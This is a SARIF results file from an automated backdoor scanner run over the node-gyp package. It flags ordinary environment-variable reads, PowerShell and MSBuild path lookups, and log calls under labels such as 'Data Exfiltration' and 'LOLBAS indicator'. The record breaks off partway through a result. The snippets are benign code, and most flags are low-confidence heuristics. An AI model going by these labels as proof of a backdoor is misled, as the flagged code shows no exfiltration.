{
  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
  "version": "2.1.0",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "oss-detect-backdoor",
          "organization": "Microsoft Corporation",
          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
          "version": "0.0.0+4a24249b20"
        }
      },
      "results": [
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/process-release.js"
                },
                "region": {
                  "startLine": 65,
                  "startColumn": 22,
                  "endLine": 65,
                  "endColumn": 33,
                  "snippet": {
                    "text": "\n  // check for the nvm.sh standard mirror env variables\n  if (!overrideDistUrl && process.env.NODEJS_ORG_MIRROR) {\n    overrideDistUrl = process.env.NODEJS_ORG_MIRROR\n  }\n\n  if (overrideDistUrl) {\n",
                    "rendered": {
                      "text": "\n  // check for the nvm.sh standard mirror env variables\n  if (!overrideDistUrl && process.env.NODEJS_ORG_MIRROR) {\n    overrideDistUrl = process.env.NODEJS_ORG_MIRROR\n  }\n\n  if (overrideDistUrl) {\n",
                      "markdown": "`\n  // check for the nvm.sh standard mirror env variables\n  if (!overrideDistUrl && process.env.NODEJS_ORG_MIRROR) {\n    overrideDistUrl = process.env.NODEJS_ORG_MIRROR\n  }\n\n  if (overrideDistUrl) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/process-release.js"
                },
                "region": {
                  "startLine": 64,
                  "startColumn": 26,
                  "endLine": 64,
                  "endColumn": 37,
                  "snippet": {
                    "text": "  }\n\n  // check for the nvm.sh standard mirror env variables\n  if (!overrideDistUrl && process.env.NODEJS_ORG_MIRROR) {\n    overrideDistUrl = process.env.NODEJS_ORG_MIRROR\n  }\n\n",
                    "rendered": {
                      "text": "  }\n\n  // check for the nvm.sh standard mirror env variables\n  if (!overrideDistUrl && process.env.NODEJS_ORG_MIRROR) {\n    overrideDistUrl = process.env.NODEJS_ORG_MIRROR\n  }\n\n",
                      "markdown": "`  }\n\n  // check for the nvm.sh standard mirror env variables\n  if (!overrideDistUrl && process.env.NODEJS_ORG_MIRROR) {\n    overrideDistUrl = process.env.NODEJS_ORG_MIRROR\n  }\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-visualstudio.js"
                },
                "region": {
                  "startLine": 549,
                  "startColumn": 20,
                  "endLine": 550,
                  "snippet": {
                    "text": "      }\n\n      info.path = vsPath\n      info.msBuild = msBuild\n      info.sdk = null\n      return info\n    } catch (err) {\n      this.addLog('- not found')\n",
                    "rendered": {
                      "text": "      }\n\n      info.path = vsPath\n      info.msBuild = msBuild\n      info.sdk = null\n      return info\n    } catch (err) {\n      this.addLog('- not found')\n",
                      "markdown": "`      }\n\n      info.path = vsPath\n      info.msBuild = msBuild\n      info.sdk = null\n      return info\n    } catch (err) {\n      this.addLog('- not found')\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-visualstudio.js"
                },
                "region": {
                  "startLine": 542,
                  "startColumn": 20,
                  "endLine": 542,
                  "endColumn": 29,
                  "snippet": {
                    "text": "      }\n\n      const msBuild = path.join(res, 'MSBuild.exe')\n      this.addLog(`- MSBuild in \"${msBuild}\"`)\n\n      if (!this.checkConfigVersion(info.versionYear, vsPath)) {\n        return null\n",
                    "rendered": {
                      "text": "      }\n\n      const msBuild = path.join(res, 'MSBuild.exe')\n      this.addLog(`- MSBuild in \"${msBuild}\"`)\n\n      if (!this.checkConfigVersion(info.versionYear, vsPath)) {\n        return null\n",
                      "markdown": "`      }\n\n      const msBuild = path.join(res, 'MSBuild.exe')\n      this.addLog(`- MSBuild in \"${msBuild}\"`)\n\n      if (!this.checkConfigVersion(info.versionYear, vsPath)) {\n        return null\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-visualstudio.js"
                },
                "region": {
                  "startLine": 541,
                  "startColumn": 11,
                  "endLine": 541,
                  "endColumn": 20,
                  "snippet": {
                    "text": "        return null\n      }\n\n      const msBuild = path.join(res, 'MSBuild.exe')\n      this.addLog(`- MSBuild in \"${msBuild}\"`)\n\n      if (!this.checkConfigVersion(info.versionYear, vsPath)) {\n",
                    "rendered": {
                      "text": "        return null\n      }\n\n      const msBuild = path.join(res, 'MSBuild.exe')\n      this.addLog(`- MSBuild in \"${msBuild}\"`)\n\n      if (!this.checkConfigVersion(info.versionYear, vsPath)) {\n",
                      "markdown": "`        return null\n      }\n\n      const msBuild = path.join(res, 'MSBuild.exe')\n      this.addLog(`- MSBuild in \"${msBuild}\"`)\n\n      if (!this.checkConfigVersion(info.versionYear, vsPath)) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-visualstudio.js"
                },
                "region": {
                  "startLine": 537,
                  "startColumn": 37,
                  "endLine": 537,
                  "endColumn": 46,
                  "snippet": {
                    "text": "      try {\n        res = await this.regSearchKeys([`${regMSBuild}\\\\${info.version}`], 'MSBuildToolsPath', msBuildRegOpts)\n      } catch (err) {\n        this.addLog('- could not find MSBuild in registry for this version')\n        return null\n      }\n\n",
                    "rendered": {
                      "text": "      try {\n        res = await this.regSearchKeys([`${regMSBuild}\\\\${info.version}`], 'MSBuildToolsPath', msBuildRegOpts)\n      } catch (err) {\n        this.addLog('- could not find MSBuild in registry for this version')\n        return null\n      }\n\n",
                      "markdown": "`      try {\n        res = await this.regSearchKeys([`${regMSBuild}\\\\${info.version}`], 'MSBuildToolsPath', msBuildRegOpts)\n      } catch (err) {\n        this.addLog('- could not find MSBuild in registry for this version')\n        return null\n      }\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-visualstudio.js"
                },
                "region": {
                  "startLine": 321,
                  "startColumn": 98,
                  "endLine": 321,
                  "endColumn": 102,
                  "snippet": {
                    "text": "      if (info.versionYear && supportedYears.indexOf(info.versionYear) !== -1) {\n        return true\n      }\n      this.addLog(`${info.versionYear ? 'unsupported' : 'unknown'} version \"${info.version}\" found at \"${info.path}\"`)\n      return false\n    })\n\n",
                    "rendered": {
                      "text": "      if (info.versionYear && supportedYears.indexOf(info.versionYear) !== -1) {\n        return true\n      }\n      this.addLog(`${info.versionYear ? 'unsupported' : 'unknown'} version \"${info.version}\" found at \"${info.path}\"`)\n      return false\n    })\n\n",
                      "markdown": "`      if (info.versionYear && supportedYears.indexOf(info.versionYear) !== -1) {\n        return true\n      }\n      this.addLog(`${info.versionYear ? 'unsupported' : 'unknown'} version \"${info.version}\" found at \"${info.path}\"`)\n      return false\n    })\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-visualstudio.js"
                },
                "region": {
                  "startLine": 537,
                  "startColumn": 32,
                  "endLine": 537,
                  "endColumn": 38,
                  "snippet": {
                    "text": "      try {\n        res = await this.regSearchKeys([`${regMSBuild}\\\\${info.version}`], 'MSBuildToolsPath', msBuildRegOpts)\n      } catch (err) {\n        this.addLog('- could not find MSBuild in registry for this version')\n        return null\n      }\n\n",
                    "rendered": {
                      "text": "      try {\n        res = await this.regSearchKeys([`${regMSBuild}\\\\${info.version}`], 'MSBuildToolsPath', msBuildRegOpts)\n      } catch (err) {\n        this.addLog('- could not find MSBuild in registry for this version')\n        return null\n      }\n\n",
                      "markdown": "`      try {\n        res = await this.regSearchKeys([`${regMSBuild}\\\\${info.version}`], 'MSBuildToolsPath', msBuildRegOpts)\n      } catch (err) {\n        this.addLog('- could not find MSBuild in registry for this version')\n        return null\n      }\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-visualstudio.js"
                },
                "region": {
                  "startLine": 505,
                  "startColumn": 4,
                  "endLine": 505,
                  "endColumn": 10,
                  "snippet": {
                    "text": "    })\n  }\n\n  // Find an installation of Visual Studio 2013 to use\n  async findVisualStudio2013 () {\n    if (this.nodeSemver.major >= 9) {\n      this.addLog(\n",
                    "rendered": {
                      "text": "    })\n  }\n\n  // Find an installation of Visual Studio 2013 to use\n  async findVisualStudio2013 () {\n    if (this.nodeSemver.major >= 9) {\n      this.addLog(\n",
                      "markdown": "`    })\n  }\n\n  // Find an installation of Visual Studio 2013 to use\n  async findVisualStudio2013 () {\n    if (this.nodeSemver.major >= 9) {\n      this.addLog(\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-visualstudio.js"
                },
                "region": {
                  "startLine": 489,
                  "startColumn": 4,
                  "endLine": 489,
                  "endColumn": 10,
                  "snippet": {
                    "text": "    return null\n  }\n\n  // Find an installation of Visual Studio 2015 to use\n  async findVisualStudio2015 () {\n    if (this.nodeSemver.major >= 19) {\n      this.addLog(\n",
                    "rendered": {
                      "text": "    return null\n  }\n\n  // Find an installation of Visual Studio 2015 to use\n  async findVisualStudio2015 () {\n    if (this.nodeSemver.major >= 19) {\n      this.addLog(\n",
                      "markdown": "`    return null\n  }\n\n  // Find an installation of Visual Studio 2015 to use\n  async findVisualStudio2015 () {\n    if (this.nodeSemver.major >= 19) {\n      this.addLog(\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-visualstudio.js"
                },
                "region": {
                  "startLine": 362,
                  "startColumn": 16,
                  "endLine": 362,
                  "endColumn": 22,
                  "snippet": {
                    "text": "    }\n\n    this.addLog(\n      'could not find a version of Visual Studio 2017 or newer to use')\n    return null\n  }\n\n",
                    "rendered": {
                      "text": "    }\n\n    this.addLog(\n      'could not find a version of Visual Studio 2017 or newer to use')\n    return null\n  }\n\n",
                      "markdown": "`    }\n\n    this.addLog(\n      'could not find a version of Visual Studio 2017 or newer to use')\n    return null\n  }\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-visualstudio.js"
                },
                "region": {
                  "startLine": 274,
                  "startColumn": 36,
                  "endLine": 274,
                  "endColumn": 42,
                  "snippet": {
                    "text": "\n    const failPowershell = (failureDetails) => {\n      this.addLog(\n        `could not use PowerShell to find Visual Studio 2017 or newer, try re-running with '--loglevel silly' for more details. \\n\n        Failure details: ${failureDetails}`)\n      return null\n    }\n",
                    "rendered": {
                      "text": "\n    const failPowershell = (failureDetails) => {\n      this.addLog(\n        `could not use PowerShell to find Visual Studio 2017 or newer, try re-running with '--loglevel silly' for more details. \\n\n        Failure details: ${failureDetails}`)\n      return null\n    }\n",
                      "markdown": "`\n    const failPowershell = (failureDetails) => {\n      this.addLog(\n        `could not use PowerShell to find Visual Studio 2017 or newer, try re-running with '--loglevel silly' for more details. \\n\n        Failure details: ${failureDetails}`)\n      return null\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-visualstudio.js"
                },
                "region": {
                  "startLine": 238,
                  "startColumn": 26,
                  "endLine": 238,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    return this.findNewVS([2017])\n  }\n\n  // Invoke the PowerShell script to get information about Visual Studio 2017\n  // or newer installations\n  async findNewVS (supportedYears) {\n    const ps = path.join(process.env.SystemRoot, 'System32',\n",
                    "rendered": {
                      "text": "    return this.findNewVS([2017])\n  }\n\n  // Invoke the PowerShell script to get information about Visual Studio 2017\n  // or newer installations\n  async findNewVS (supportedYears) {\n    const ps = path.join(process.env.SystemRoot, 'System32',\n",
                      "markdown": "`    return this.findNewVS([2017])\n  }\n\n  // Invoke the PowerShell script to get information about Visual Studio 2017\n  // or newer installations\n  async findNewVS (supportedYears) {\n    const ps = path.join(process.env.SystemRoot, 'System32',\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-visualstudio.js"
                },
                "region": {
                  "startLine": 228,
                  "startColumn": 26,
                  "endLine": 228,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    return this.findNewVS([2019, 2022])\n  }\n\n  // Invoke the PowerShell script to get information about Visual Studio 2017\n  async findVisualStudio2017 () {\n    if (this.nodeSemver.major >= 22) {\n      this.addLog(\n",
                    "rendered": {
                      "text": "    return this.findNewVS([2019, 2022])\n  }\n\n  // Invoke the PowerShell script to get information about Visual Studio 2017\n  async findVisualStudio2017 () {\n    if (this.nodeSemver.major >= 22) {\n      this.addLog(\n",
                      "markdown": "`    return this.findNewVS([2019, 2022])\n  }\n\n  // Invoke the PowerShell script to get information about Visual Studio 2017\n  async findVisualStudio2017 () {\n    if (this.nodeSemver.major >= 22) {\n      this.addLog(\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-visualstudio.js"
                },
                "region": {
                  "startLine": 222,
                  "startColumn": 26,
                  "endLine": 222,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    return this.processData(parsedData, supportedYears)\n  }\n\n  // Invoke the PowerShell script to get information about Visual Studio 2019\n  // or newer installations\n  async findVisualStudio2019OrNewer () {\n    return this.findNewVS([2019, 2022])\n",
                    "rendered": {
                      "text": "    return this.processData(parsedData, supportedYears)\n  }\n\n  // Invoke the PowerShell script to get information about Visual Studio 2019\n  // or newer installations\n  async findVisualStudio2019OrNewer () {\n    return this.findNewVS([2019, 2022])\n",
                      "markdown": "`    return this.processData(parsedData, supportedYears)\n  }\n\n  // Invoke the PowerShell script to get information about Visual Studio 2019\n  // or newer installations\n  async findVisualStudio2019OrNewer () {\n    return this.findNewVS([2019, 2022])\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-visualstudio.js"
                },
                "region": {
                  "startLine": 118,
                  "startColumn": 30,
                  "endLine": 118,
                  "endColumn": 36,
                  "snippet": {
                    "text": "    ].join('\\n')\n\n    this.log.error(`\\n${errorLog}\\n\\n${infoLog}\\n`)\n    throw new Error('Could not find any Visual Studio installation to use')\n  }\n\n  async findVisualStudio2019OrNewerFromSpecifiedLocation () {\n",
                    "rendered": {
                      "text": "    ].join('\\n')\n\n    this.log.error(`\\n${errorLog}\\n\\n${infoLog}\\n`)\n    throw new Error('Could not find any Visual Studio installation to use')\n  }\n\n  async findVisualStudio2019OrNewerFromSpecifiedLocation () {\n",
                      "markdown": "`    ].join('\\n')\n\n    this.log.error(`\\n${errorLog}\\n\\n${infoLog}\\n`)\n    throw new Error('Could not find any Visual Studio installation to use')\n  }\n\n  async findVisualStudio2019OrNewerFromSpecifiedLocation () {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-visualstudio.js"
                },
                "region": {
                  "startLine": 241,
                  "startColumn": 25,
                  "endLine": 241,
                  "endColumn": 36,
                  "snippet": {
                    "text": "  // Invoke the PowerShell script to get information about Visual Studio 2017\n  // or newer installations\n  async findNewVS (supportedYears) {\n    const ps = path.join(process.env.SystemRoot, 'System32',\n      'WindowsPowerShell', 'v1.0', 'powershell.exe')\n    const csFile = path.join(__dirname, 'Find-VisualStudio.cs')\n    const psArgs = [\n",
                    "rendered": {
                      "text": "  // Invoke the PowerShell script to get information about Visual Studio 2017\n  // or newer installations\n  async findNewVS (supportedYears) {\n    const ps = path.join(process.env.SystemRoot, 'System32',\n      'WindowsPowerShell', 'v1.0', 'powershell.exe')\n    const csFile = path.join(__dirname, 'Find-VisualStudio.cs')\n    const psArgs = [\n",
                      "markdown": "`  // Invoke the PowerShell script to get information about Visual Studio 2017\n  // or newer installations\n  async findNewVS (supportedYears) {\n    const ps = path.join(process.env.SystemRoot, 'System32',\n      'WindowsPowerShell', 'v1.0', 'powershell.exe')\n    const csFile = path.join(__dirname, 'Find-VisualStudio.cs')\n    const psArgs = [\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-visualstudio.js"
                },
                "region": {
                  "startLine": 177,
                  "startColumn": 25,
                  "endLine": 177,
                  "endColumn": 36,
                  "snippet": {
                    "text": "  }\n\n  async findNewVSUsingSetupModule (supportedYears) {\n    const ps = path.join(process.env.SystemRoot, 'System32',\n      'WindowsPowerShell', 'v1.0', 'powershell.exe')\n    const vcInstallDir = this.envVcInstallDir\n\n",
                    "rendered": {
                      "text": "  }\n\n  async findNewVSUsingSetupModule (supportedYears) {\n    const ps = path.join(process.env.SystemRoot, 'System32',\n      'WindowsPowerShell', 'v1.0', 'powershell.exe')\n    const vcInstallDir = this.envVcInstallDir\n\n",
                      "markdown": "`  }\n\n  async findNewVSUsingSetupModule (supportedYears) {\n    const ps = path.join(process.env.SystemRoot, 'System32',\n      'WindowsPowerShell', 'v1.0', 'powershell.exe')\n    const vcInstallDir = this.envVcInstallDir\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-visualstudio.js"
                },
                "region": {
                  "startLine": 154,
                  "startColumn": 33,
                  "endLine": 154,
                  "endColumn": 44,
                  "snippet": {
                    "text": "    }\n\n    // Is there a better way to get SDK information?\n    const envWindowsSDKVersion = process.env.WindowsSDKVersion\n    const sdkVersionMatched = envWindowsSDKVersion?.match(/^(\\d+)\\.(\\d+)\\.(\\d+)\\..*/)\n    if (sdkVersionMatched) {\n      info.packages.push(`Microsoft.VisualStudio.Component.Windows10SDK.${sdkVersionMatched[3]}.Desktop`)\n",
                    "rendered": {
                      "text": "    }\n\n    // Is there a better way to get SDK information?\n    const envWindowsSDKVersion = process.env.WindowsSDKVersion\n    const sdkVersionMatched = envWindowsSDKVersion?.match(/^(\\d+)\\.(\\d+)\\.(\\d+)\\..*/)\n    if (sdkVersionMatched) {\n      info.packages.push(`Microsoft.VisualStudio.Component.Windows10SDK.${sdkVersionMatched[3]}.Desktop`)\n",
                      "markdown": "`    }\n\n    // Is there a better way to get SDK information?\n    const envWindowsSDKVersion = process.env.WindowsSDKVersion\n    const sdkVersionMatched = envWindowsSDKVersion?.match(/^(\\d+)\\.(\\d+)\\.(\\d+)\\..*/)\n    if (sdkVersionMatched) {\n      info.packages.push(`Microsoft.VisualStudio.Component.Windows10SDK.${sdkVersionMatched[3]}.Desktop`)\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-visualstudio.js"
                },
                "region": {
                  "startLine": 145,
                  "startColumn": 15,
                  "endLine": 145,
                  "endColumn": 26,
                  "snippet": {
                    "text": "      // VSCMD_VER environment variable which contains the version information\n      // for Visual Studio.\n      // https://learn.microsoft.com/en-us/visualstudio/ide/reference/command-prompt-powershell?view=vs-2022\n      version: process.env.VSCMD_VER,\n      packages: [\n        'Microsoft.VisualStudio.Component.VC.Tools.x86.x64',\n        // Assume MSBuild exists. It will be checked in processing.\n",
                    "rendered": {
                      "text": "      // VSCMD_VER environment variable which contains the version information\n      // for Visual Studio.\n      // https://learn.microsoft.com/en-us/visualstudio/ide/reference/command-prompt-powershell?view=vs-2022\n      version: process.env.VSCMD_VER,\n      packages: [\n        'Microsoft.VisualStudio.Component.VC.Tools.x86.x64',\n        // Assume MSBuild exists. It will be checked in processing.\n",
                      "markdown": "`      // VSCMD_VER environment variable which contains the version information\n      // for Visual Studio.\n      // https://learn.microsoft.com/en-us/visualstudio/ide/reference/command-prompt-powershell?view=vs-2022\n      version: process.env.VSCMD_VER,\n      packages: [\n        'Microsoft.VisualStudio.Component.VC.Tools.x86.x64',\n        // Assume MSBuild exists. It will be checked in processing.\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-visualstudio.js"
                },
                "region": {
                  "startLine": 49,
                  "startColumn": 21,
                  "endLine": 49,
                  "endColumn": 32,
                  "snippet": {
                    "text": "\n    if (process.env.VCINSTALLDIR) {\n      this.envVcInstallDir =\n        path.resolve(process.env.VCINSTALLDIR, '..')\n      this.addLog('running in VS Command Prompt, installation path is:\\n' +\n        `\"${this.envVcInstallDir}\"\\n- will only use this version`)\n    } else {\n",
                    "rendered": {
                      "text": "\n    if (process.env.VCINSTALLDIR) {\n      this.envVcInstallDir =\n        path.resolve(process.env.VCINSTALLDIR, '..')\n      this.addLog('running in VS Command Prompt, installation path is:\\n' +\n        `\"${this.envVcInstallDir}\"\\n- will only use this version`)\n    } else {\n",
                      "markdown": "`\n    if (process.env.VCINSTALLDIR) {\n      this.envVcInstallDir =\n        path.resolve(process.env.VCINSTALLDIR, '..')\n      this.addLog('running in VS Command Prompt, installation path is:\\n' +\n        `\"${this.envVcInstallDir}\"\\n- will only use this version`)\n    } else {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-visualstudio.js"
                },
                "region": {
                  "startLine": 47,
                  "startColumn": 8,
                  "endLine": 47,
                  "endColumn": 19,
                  "snippet": {
                    "text": "      this.addLog('msvs_version not set from command line or npm config')\n    }\n\n    if (process.env.VCINSTALLDIR) {\n      this.envVcInstallDir =\n        path.resolve(process.env.VCINSTALLDIR, '..')\n      this.addLog('running in VS Command Prompt, installation path is:\\n' +\n",
                    "rendered": {
                      "text": "      this.addLog('msvs_version not set from command line or npm config')\n    }\n\n    if (process.env.VCINSTALLDIR) {\n      this.envVcInstallDir =\n        path.resolve(process.env.VCINSTALLDIR, '..')\n      this.addLog('running in VS Command Prompt, installation path is:\\n' +\n",
                      "markdown": "`      this.addLog('msvs_version not set from command line or npm config')\n    }\n\n    if (process.env.VCINSTALLDIR) {\n      this.envVcInstallDir =\n        path.resolve(process.env.VCINSTALLDIR, '..')\n      this.addLog('running in VS Command Prompt, installation path is:\\n' +\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/log.js"
                },
                "region": {
                  "startLine": 143,
                  "startColumn": 30,
                  "endLine": 143,
                  "endColumn": 35,
                  "snippet": {
